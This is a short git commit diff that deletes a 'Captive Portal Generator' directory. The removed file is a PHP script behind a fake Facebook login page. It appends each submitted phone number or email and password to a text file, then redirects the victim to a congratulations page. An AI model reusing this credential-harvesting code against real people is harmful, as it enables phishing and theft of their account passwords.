a7e9b91b17f4fd7735e5c2c7b4246e6419c75d21
Dipesh Dhakal <79372111+coderdipesh@users.noreply.github.com>
2021-09-16 20:25:15 +0545

    Delete Captive Portal Generator directory

--- Captive Portal Generator/module/facebook/login.php
+++
@@ -1,5 +0,0 @@
-<?php
-
-file_put_contents("database.txt",  " Phone Number: " . $_POST['email'] . " ,Password: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: /congratulations/');
-exit();
